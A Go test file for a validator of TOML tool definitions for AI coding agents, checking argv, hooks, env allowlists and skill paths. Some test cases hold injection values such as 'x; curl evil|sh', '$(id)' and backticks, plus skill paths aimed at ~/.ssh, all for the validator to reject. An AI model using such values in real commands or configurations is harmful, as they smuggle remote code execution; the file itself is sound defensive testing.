package tooldef

import (
	"errors"
	"fmt"
	"os"
	"strings"
	"testing"

	"github.com/congdoe/aggy/internal/adapter"
	"github.com/congdoe/aggy/internal/fakecli"
)

// TestMain keeps every test off the real home and state directory.
func TestMain(m *testing.M) { os.Exit(fakecli.IsolatedMain(m)) }

const base = `name = "demo"
description = "A demo tool"
homepage = "https://example.com/demo"
version = "1.2.3"
scope = "global"

[install]
check = ["demo", "--version"]

[[mcp]]
vendors = ["claude", "codex"]
argv = ["demo", "serve", "{repo}"]
env = ["DEMO_HOME"]

[[hook]]
vendors = ["grok"]
event = "PostToolUse"
matcher = "run_terminal_cmd"
timeout = 10
argv = ["/usr/local/bin/demo", "hook"]

[cost]
method = "mcp-schema"
`

// initStep is a valid built-in init step, appended to base.
const initStep = `[[init]]
vendors = ["claude"]
argv = ["demo", "init"]
undo = ["demo", "uninit"]
writes = ["~/.claude/settings.json: hooks.PreToolUse"]
`

// skillOnly is a valid definition with only a skill part.
const skillOnly = `name = "brief"
description = "A skill"
version = "1"
scope = "global"

[[skill]]
vendors = ["claude"]
path = "~/.aggy/skills/brief"

[cost]
method = "skill-md"
`

func set(old, new string) func(string) string {
	return func(s string) string {
		if !strings.Contains(s, old) {
			panic("base lacks " + old)
		}
		return strings.Replace(s, old, new, 1)
	}
}

// pre adds top-level keys, which must come before the first table.
func pre(extra string) func(string) string { return func(s string) string { return extra + "\n" + s } }

// post appends tables.
func post(extra string) func(string) string { return func(s string) string { return s + extra } }

// on starts from another definition than base.
func on(text string, edit func(string) string) func(string) string {
	return func(string) string { return edit(text) }
}

func manyArgs(n int) string {
	a := make([]string, n)
	for i := range a {
		a[i] = `"x"`
	}
	return `argv = ["demo", ` + strings.Join(a, ", ") + `]`
}

func manyEnv(n int) string {
	a := make([]string, n)
	for i := range a {
		a[i] = fmt.Sprintf(`"DEMO_V%d"`, i)
	}
	return `env = [` + strings.Join(a, ", ") + `]`
}

const mcpArgv = `argv = ["demo", "serve", "{repo}"]`

func TestParseValid(t *testing.T) {
	for _, c := range []struct {
		name, text string
		builtIn    bool
	}{
		{"base", base, false},
		{"skill only, no check", skillOnly, false},
		{"skill below its folder", strings.Replace(skillOnly, `"~/.aggy/skills/brief"`, `"~/.aggy/skills/brief/v2"`, 1), false},
		{"repo scope with condition", strings.Replace(base, `scope = "global"`, "scope = \"repo\"\nwhen = \"has-ui\"", 1), false},
		{"no homepage", strings.Replace(base, "homepage = \"https://example.com/demo\"\n", "", 1), false},
		{"built-in default on", "default = true\n" + base, true},
		{"built-in unpinned", strings.Replace(base, `"1.2.3"`, `"unpinned"`, 1), true},
		{"built-in lifecycle", `lifecycle = ["worktree-copy", "gc", "refresh"]` + "\n" + base, true},
		{"built-in init", base + initStep, true},
		{"built-in deciding hook", base + "[[hook]]\nvendors = [\"claude\"]\nevent = \"PreToolUse\"\nmatcher = \"Bash\"\ndecides = true\nargv = [\"demo\", \"hook\"]\n", true},
		{"built-in skill under home", strings.Replace(skillOnly, `"~/.aggy/skills/brief"`, `"~/Library/brief"`, 1), true},
		{"built-in env", strings.Replace(base, `"DEMO_HOME"`, `"CONTEXT_DIR"`, 1), true},
		{"unverified keys", `unverified = ["version", "mcp", "install"]` + "\n" + base, false},
		{"static cost", strings.Replace(base, `method = "mcp-schema"`, "method = \"static\"\ntokens = 300", 1), false},
		{"static cost per vendor", strings.Replace(base, `method = "mcp-schema"`, "method = \"static\"\n[cost.vendor]\nclaude = 300\ngrok = 100", 1), false},
		{"check pattern", strings.Replace(base, `check = ["demo", "--version"]`, "check = [\"demo\", \"--version\"]\ncheck_pattern = 'demo v(\\d+\\.\\d+\\.\\d+)'", 1), false},
		{"two mcp entries", strings.Replace(base, "[[hook]]", "[[mcp]]\nvendors = [\"grok\"]\nargv = [\"demo\", \"serve\", \"--grok\"]\n\n[[hook]]", 1), false},
		{"crlf", strings.ReplaceAll(base, "\n", "\r\n"), false},
		{"npx", strings.Replace(base, mcpArgv, `argv = ["npx", "-y", "@demo/server@1.2.3"]`, 1), false},
		{"shasum is not sh", strings.Replace(base, mcpArgv, `argv = ["shasum", "-a", "256"]`, 1), false},
		{"node with a script", strings.Replace(base, mcpArgv, `argv = ["node", "/opt/demo/server.js", "--port=3000"]`, 1), false},
		{"nice then a program", strings.Replace(base, mcpArgv, `argv = ["nice", "-n", "5", "demo", "serve"]`, 1), false},
	} {
		t.Run(c.name, func(t *testing.T) {
			if _, err := Parse("demo.toml", []byte(c.text), c.builtIn); err != nil {
				t.Fatal(err)
			}
		})
	}
}

// TestParseRefuses covers every validator rule: each case breaks one
// rule of a valid definition, and the error names the file and the key.
func TestParseRefuses(t *testing.T) {
	cases := []struct {
		name    string
		edit    func(string) string
		builtIn bool
		key     string // the key the error names; "" is the whole file
		want    string // a substring of the message
	}{
		// Size, encoding, characters.
		{"too large", func(s string) string { return s + "#" + strings.Repeat("x", MaxSize) }, false, "", "bytes"},
		{"not UTF-8", func(s string) string { return s + "# \xff\n" }, false, "", "UTF-8"},
		{"bidi in a comment", func(s string) string { return s + "# \u202e hidden\n" }, false, "", "line"},
		{"zero width in a comment", func(s string) string { return s + "#\u200b\n" }, false, "", "line"},
		{"line separator in a comment", func(s string) string { return s + "# a\u2028b\n" }, false, "", "line"},
		{"paragraph separator in a comment", func(s string) string { return s + "# a\u2029b\n" }, false, "", "line"},
		{"escaped bell in description", set(`"A demo tool"`, `"A demo\u0007tool"`), false, "description", "control"},
		{"escaped line separator in description", set(`"A demo tool"`, `"A demo\u2028tool"`), false, "description", "control"},
		{"escaped zero width in an argument", set(mcpArgv, `argv = ["demo", "ser\u200bve"]`), false, "mcp[0].argv", "control"},
		{"escaped newline in the program", set(mcpArgv, `argv = ["de\nmo", "serve"]`), false, "mcp[0].argv", "control"},
		{"unknown key", pre(`colour = "red"`), false, "colour", "unknown"},
		{"unknown nested key", set(`method = "mcp-schema"`, "method = \"mcp-schema\"\nfoo = 1"), false, "cost.foo", "unknown"},

		// Keys are lower case: the decoder would merge [MCP] or ARGV.
		{"upper-case key", set(mcpArgv, `ARGV = ["sh"]`), false, "mcp.ARGV", "lower case"},
		{"key twice by case", set(mcpArgv, mcpArgv+"\nArgv = [\"sh\", \"-c\", \"x\"]"), false, "mcp.Argv", "lower case"},
		{"upper-case table", post("[[MCP]]\nvendors = [\"grok\"]\nargv = [\"x\"]\n"), false, "MCP", "lower case"},
		{"upper-case top key", pre(`Name = "other"`), false, "Name", "lower case"},
		{"single mcp table", set("[[mcp]]", "[mcp]"), false, "", ""},

		// Name, text fields, version.
		{"name upper case", set(`name = "demo"`, `name = "Demo"`), false, "name", ""},
		{"name with a path", set(`name = "demo"`, `name = "../demo"`), false, "name", ""},
		{"name too long", set(`name = "demo"`, `name = "`+strings.Repeat("a", 33)+`"`), false, "name", ""},
		{"name missing", set(`name = "demo"`, ``), false, "name", ""},
		{"description missing", set(`description = "A demo tool"`, ``), false, "description", "required"},
		{"description too long", set(`"A demo tool"`, `"`+strings.Repeat("d", maxDescription+1)+`"`), false, "description", "bytes"},
		{"homepage http", set(`https://example.com/demo`, `http://example.com/demo`), false, "homepage", "https"},
		{"homepage user info", set(`https://example.com/demo`, `https://u:p@example.com/demo`), false, "homepage", "user info"},
		{"homepage no host", set(`https://example.com/demo`, `https:///demo`), false, "homepage", ""},
		{"version missing", set(`version = "1.2.3"`, ``), false, "version", "pinned"},
		{"version with a space", set(`version = "1.2.3"`, `version = "1.2 3"`), false, "version", ""},
		{"version range", set(`version = "1.2.3"`, `version = "^1.2"`), false, "version", ""},
		{"user version latest", set(`version = "1.2.3"`, `version = "latest"`), false, "version", "digit"},
		{"user version unpinned", set(`version = "1.2.3"`, `version = "unpinned"`), false, "version", "digit"},

		// Default, scope, condition, parts.
		{"user tool default on", pre("default = true"), false, "default", "off"},
		{"unknown scope", set(`scope = "global"`, `scope = "world"`), false, "scope", ""},
		{"condition on a global tool", pre(`when = "has-ui"`), false, "when", ""},
		{"unknown condition", set(`scope = "global"`, "scope = \"repo\"\nwhen = \"has-gpu\""), false, "when", ""},
		{"no parts", func(string) string {
			return "name = \"x\"\ndescription = \"d\"\nversion = \"1\"\nscope = \"global\"\n[cost]\nmethod = \"none\"\n"
		}, false, "mcp", "at least one part"},

		// Vendors.
		{"no vendors", set(`vendors = ["claude", "codex"]`, `vendors = []`), false, "mcp[0].vendors", "at least one"},
		{"unknown vendor", set(`vendors = ["claude", "codex"]`, `vendors = ["claude", "gemini"]`), false, "mcp[0].vendors[1]", ""},
		{"vendor twice", set(`vendors = ["claude", "codex"]`, `vendors = ["codex", "codex"]`), false, "mcp[0].vendors[1]", "twice"},
		{"vendor in two mcp entries", set("[[hook]]", "[[mcp]]\nvendors = [\"codex\"]\nargv = [\"demo\"]\n\n[[hook]]"), false, "mcp[1].vendors[0]", "another entry"},
		{"too many mcp entries", post(strings.Repeat("[[mcp]]\nvendors = [\"grok\"]\nargv = [\"demo\"]\n", maxParts)), false, "mcp", "at most"},

		// Argv: never a shell string, programs bare or absolute.
		{"shell string", set(mcpArgv, `argv = "demo serve"`), false, "", ""},
		{"program with a space", set(mcpArgv, `argv = ["demo serve"]`), false, "mcp[0].argv", "shell string"},
		{"empty argv", set(mcpArgv, `argv = []`), false, "mcp[0].argv", "program"},
		{"empty program", set(mcpArgv, `argv = [""]`), false, "mcp[0].argv", ""},
		{"relative program", set(mcpArgv, `argv = ["./demo"]`), false, "mcp[0].argv", "bare name"},
		{"program in a subfolder", set(mcpArgv, `argv = ["bin/demo"]`), false, "mcp[0].argv", "bare name"},
		{"dot dot program", set(mcpArgv, `argv = [".."]`), false, "mcp[0].argv", "bare name"},
		{"unclean absolute program", set(mcpArgv, `argv = ["/usr/../bin/demo"]`), false, "mcp[0].argv", "clean"},
		{"too many arguments", set(mcpArgv, manyArgs(maxArgs)), false, "mcp[0].argv", "at most"},
		{"argument too long", set(mcpArgv, `argv = ["demo", "`+strings.Repeat("a", maxArg+1)+`"]`), false, "mcp[0].argv", "bytes"},
		{"other placeholder", set(mcpArgv, `argv = ["demo", "{home}"]`), false, "mcp[0].argv", "placeholder"},
		{"stray brace", set(mcpArgv, `argv = ["demo", "{repo"]`), false, "mcp[0].argv", "placeholder"},
		{"check shell", set(`check = ["demo", "--version"]`, `check = ["bash", "-c", "demo"]`), false, "install.check", "shell"},
		{"install relative", set(`check = ["demo", "--version"]`, "check = [\"demo\"]\ninstall = [\"./install.sh\"]"), false, "install.install", "bare name"},
		{"prebuild shell", set(`check = ["demo", "--version"]`, "check = [\"demo\"]\nprebuild = [\"dash\", \"-c\", \"x\"]"), false, "install.prebuild", "shell"},
		{"check missing with mcp", set(`check = ["demo", "--version"]`, ``), false, "install.check", "program"},
		{"check pattern without a group", set(`check = ["demo", "--version"]`, "check = [\"demo\"]\ncheck_pattern = 'v\\d+'"), false, "install.check_pattern", "capture group"},
		{"check pattern with two groups", set(`check = ["demo", "--version"]`, "check = [\"demo\"]\ncheck_pattern = '(v)(\\d+)'"), false, "install.check_pattern", "capture group"},
		{"check pattern invalid", set(`check = ["demo", "--version"]`, "check = [\"demo\"]\ncheck_pattern = '(v'"), false, "install.check_pattern", "regular expression"},
		{"check pattern without check", on(skillOnly, post("[install]\ncheck_pattern = '(v)'\n")), false, "install.check_pattern", "needs install.check"},

		// Env allowlist: user tools pass only their own variables.
		{"user env without the prefix", set(`env = ["DEMO_HOME"]`, `env = ["CONTEXT_DIR"]`), false, "mcp[0].env[0]", "DEMO_"},
		{"user env with the prefix and a secret", set(`env = ["DEMO_HOME"]`, `env = ["DEMO_API_KEY"]`), false, "mcp[0].env[0]", "secret"},
		{"env value", set(`env = ["DEMO_HOME"]`, `env = ["DEMO_HOME=/x"]`), false, "mcp[0].env[0]", "variable name"},
		{"env twice", set(`env = ["DEMO_HOME"]`, `env = ["DEMO_HOME", "DEMO_HOME"]`), false, "mcp[0].env[1]", "twice"},
		{"too many env", set(`env = ["DEMO_HOME"]`, manyEnv(maxEnv+1)), false, "mcp[0].env", "at most"},
		{"env table", set(`env = ["DEMO_HOME"]`, `env = { DEMO_HOME = "/x" }`), false, "", ""},

		// Skill paths.
		{"skill absolute path", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"/opt/skills/brief"`)), false, "skill[0].path", "under ~/"},
		{"skill root", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"/"`)), true, "skill[0].path", "under ~/"},
		{"skill relative path", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"skills/brief"`)), false, "skill[0].path", "under ~/"},
		{"skill path escapes home", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/../other"`)), false, "skill[0].path", "under ~/"},
		{"skill home itself", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/"`)), true, "skill[0].path", "under ~/"},
		{"user skill in another tool's folder", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.aggy/skills/other"`)), false, "skill[0].path", "~/.aggy/skills/brief"},
		{"user skill with a name prefix", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.aggy/skills/briefcase"`)), false, "skill[0].path", "~/.aggy/skills/brief"},
		{"user skill in the claude home", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.claude"`)), false, "skill[0].path", ""},
		{"built-in skill in the claude home", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.claude/skills"`)), true, "skill[0].path", "dot folders"},
		{"built-in skill in ssh", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.ssh"`)), true, "skill[0].path", "dot folders"},
		{"built-in skill in the codex home", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.codex"`)), true, "skill[0].path", "dot folders"},
		{"built-in skill in the grok home", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.grok/skills/x"`)), true, "skill[0].path", "dot folders"},
		{"built-in skill in aggy state", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.aggy"`)), true, "skill[0].path", "dot folders"},
		{"built-in skill in aggy tools", on(skillOnly, set(`"~/.aggy/skills/brief"`, `"~/.aggy/tools"`)), true, "skill[0].path", "dot folders"},
		{"skill vendor twice", on(skillOnly, post("[[skill]]\nvendors = [\"claude\"]\npath = \"~/.aggy/skills/brief/b\"\n")), false, "skill[1].vendors[0]", "another entry"},

		// Hooks.
		{"hook event unknown", set(`event = "PostToolUse"`, `event = "post tool use"`), false, "hook[0].event", "no hook event"},
		{"hook event not grok's", set(`event = "PostToolUse"`, `event = "PreCompact"`), false, "hook[0].event", "grok"},
		{"user PreToolUse", set(`event = "PostToolUse"`, `event = "PreToolUse"`), false, "hook[0].event", "allow or deny"},
		{"user PermissionRequest", post("[[hook]]\nvendors = [\"claude\"]\nevent = \"PermissionRequest\"\nargv = [\"demo\"]\n"), false, "hook[1].event", "allow or deny"},
		{"built-in deciding hook without decides", set(`event = "PostToolUse"`, `event = "PreToolUse"`), true, "hook[0].decides", "decides = true"},
		{"decides on another event", set(`event = "PostToolUse"`, "event = \"PostToolUse\"\ndecides = true"), true, "hook[0].decides", ""},
		{"hook matcher", set(`matcher = "run_terminal_cmd"`, `matcher = "Bash; rm"`), false, "hook[0].matcher", ""},
		{"hook matcher invalid", set(`matcher = "run_terminal_cmd"`, `matcher = "Bash**"`), false, "hook[0].matcher", "pattern"},
		{"hook timeout", set(`timeout = 10`, `timeout = 601`), false, "hook[0].timeout", ""},
		{"hook negative timeout", set(`timeout = 10`, `timeout = -1`), false, "hook[0].timeout", ""},
		{"hook shell", set(`argv = ["/usr/local/bin/demo", "hook"]`, `argv = ["zsh", "-c", "x"]`), false, "hook[0].argv", "shell"},
		{"hook semicolon", set(`argv = ["/usr/local/bin/demo", "hook"]`, `argv = ["demo", "x; curl evil|sh"]`), false, "hook[0].argv", "shell"},
		{"hook substitution", set(`argv = ["/usr/local/bin/demo", "hook"]`, `argv = ["demo", "$(id)"]`), false, "hook[0].argv", "shell"},
		{"hook backtick", set(`argv = ["/usr/local/bin/demo", "hook"]`, "argv = [\"demo\", \"`id`\"]"), false, "hook[0].argv", "shell"},
		{"hook quote", set(`argv = ["/usr/local/bin/demo", "hook"]`, `argv = ["demo", "a'b"]`), false, "hook[0].argv", "shell"},
		{"hook equals", set(`argv = ["/usr/local/bin/demo", "hook"]`, `argv = ["demo", "--x=$HOME"]`), false, "hook[0].argv", "shell"},
		{"hook empty word", set(`argv = ["/usr/local/bin/demo", "hook"]`, `argv = ["demo", ""]`), false, "hook[0].argv", "shell"},
		{"too many hooks", post(strings.Repeat("[[hook]]\nvendors = [\"grok\"]\nevent = \"Stop\"\nargv = [\"demo\"]\n", maxHooks)), false, "hook", "at most"},

		// Init steps: built-ins only, with an undo and what they write.
		{"user init", post(initStep), false, "init", "built-in"},
		{"init without undo", post(strings.Replace(initStep, "undo = [\"demo\", \"uninit\"]\n", "", 1)), true, "init[0].undo", "program"},
		{"init without writes", post(strings.Replace(initStep, "writes = [\"~/.claude/settings.json: hooks.PreToolUse\"]\n", "", 1)), true, "init[0].writes", "name 1"},
		{"init undo shell", post(strings.Replace(initStep, `undo = ["demo", "uninit"]`, `undo = ["sh", "-c", "x"]`, 1)), true, "init[0].undo", "shell"},
		{"init vendor", post(strings.Replace(initStep, `vendors = ["claude"]`, `vendors = ["x"]`, 1)), true, "init[0].vendors[0]", ""},
		{"too many init steps", post(strings.Repeat(initStep, maxInit+1)), true, "init", "at most"},

		// Cost.
		{"cost method", set(`method = "mcp-schema"`, `method = "guess"`), false, "cost", "method"},
		{"static without tokens", set(`method = "mcp-schema"`, `method = "static"`), false, "cost", "tokens"},
		{"tokens with a measured method", set(`method = "mcp-schema"`, "method = \"mcp-schema\"\ntokens = 5"), false, "cost", "tokens"},
		{"vendor tokens with a measured method", set(`method = "mcp-schema"`, "method = \"mcp-schema\"\n[cost.vendor]\nclaude = 5"), false, "cost", "vendor"},
		{"vendor tokens unknown vendor", set(`method = "mcp-schema"`, "method = \"static\"\n[cost.vendor]\ngemini = 5"), false, "cost.vendor.gemini", ""},
		{"vendor tokens zero", set(`method = "mcp-schema"`, "method = \"static\"\n[cost.vendor]\nclaude = 0"), false, "cost.vendor.claude", "tokens"},
		{"negative tokens", set(`method = "mcp-schema"`, "method = \"static\"\ntokens = -5"), false, "cost", "tokens"},
		{"too many tokens", set(`method = "mcp-schema"`, "method = \"static\"\ntokens = 2000000"), false, "cost", "tokens"},
		{"skill-md without a skill", set(`method = "mcp-schema"`, `method = "skill-md"`), false, "cost", "skill"},
		{"mcp-schema without mcp", on(skillOnly, set(`method = "skill-md"`, `method = "mcp-schema"`)), false, "cost", "mcp"},

		// Lifecycle and unverified.
		{"user lifecycle", pre(`lifecycle = ["gc"]`), false, "lifecycle", "built-in"},
		{"unknown lifecycle", pre(`lifecycle = ["deploy"]`), true, "lifecycle[0]", ""},
		{"lifecycle twice", pre(`lifecycle = ["gc", "gc"]`), true, "lifecycle[1]", "twice"},
		{"unknown unverified key", pre(`unverified = ["mcp", "colour"]`), false, "unverified[1]", ""},
		{"unverified twice", pre(`unverified = ["mcp", "mcp"]`), false, "unverified[1]", "twice"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, err := Parse("/x/demo.toml", []byte(c.edit(base)), c.builtIn)
			var e *Error
			if !errors.As(err, &e) {
				t.Fatalf("err = %v, want a *Error", err)
			}
			if e.File != "/x/demo.toml" || e.Key != c.key {
				t.Errorf("file %q key %q, want /x/demo.toml and %q (%v)", e.File, e.Key, c.key, err)
			}
			if !strings.Contains(err.Error(), c.want) || !strings.HasPrefix(err.Error(), "/x/demo.toml: ") {
				t.Errorf("err = %q, want the file and %q", err, c.want)
			}
		})
	}
}

func TestPartsFor(t *testing.T) {
	d, err := Parse("demo.toml", []byte(base+initStep), true)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		v               adapter.Vendor
		mcp             bool
		hooks, initRuns int
	}{
		{adapter.Claude, true, 0, 1},
		{adapter.Codex, true, 0, 0},
		{adapter.Grok, false, 1, 0},
	} {
		p := d.PartsFor(c.v)
		if (p.MCP != nil) != c.mcp || len(p.Hooks) != c.hooks || len(p.Init) != c.initRuns || p.Skill != nil || p.Empty() {
			t.Errorf("%s: parts %+v", c.v, p)
		}
	}
	s, err := Parse("brief.toml", []byte(skillOnly), false)
	if err != nil {
		t.Fatal(err)
	}
	if !s.PartsFor(adapter.Codex).Empty() || s.PartsFor(adapter.Claude).Skill == nil {
		t.Error("a claude-only skill must be empty for codex and present for claude")
	}
	two, err := Parse("demo.toml", []byte(strings.Replace(base, "[[hook]]", "[[mcp]]\nvendors = [\"grok\"]\nargv = [\"demo\", \"serve\", \"--grok\"]\n\n[[hook]]", 1)), false)
	if err != nil {
		t.Fatal(err)
	}
	if m := two.PartsFor(adapter.Grok).MCP; m == nil || m.Argv[2] != "--grok" {
		t.Errorf("grok's MCP entry = %+v", m)
	}
}

// TestDesignExample: the full example in docs/design.md is a valid
// built-in definition, and without its init step a valid user one.
func TestDesignExample(t *testing.T) {
	b, err := os.ReadFile("../../docs/design.md")
	if err != nil {
		t.Fatal(err)
	}
	_, rest, ok := strings.Cut(string(b), "**Tool definitions**")
	if !ok {
		t.Fatal("design.md lacks the tool definitions section")
	}
	_, rest, _ = strings.Cut(rest, "```toml\n")
	example, _, ok := strings.Cut(rest, "```")
	if !ok {
		t.Fatal("design.md lacks the example")
	}
	d, err := Parse("design.md", []byte(example), true)
	if err != nil {
		t.Fatal(err)
	}
	if len(d.MCP) == 0 || len(d.Skills) == 0 || len(d.Hooks) == 0 || len(d.Init) == 0 || d.Install.CheckPattern == "" {
		t.Errorf("the example should show every part: %+v", d)
	}
	user, _, ok := strings.Cut(example, "[[init]]")
	if !ok {
		t.Fatal("the example lacks an init step")
	}
	if _, err := Parse("design.md", []byte(user), false); err != nil {
		t.Errorf("without its init step, the example is not a valid user tool: %v", err)
	}
}
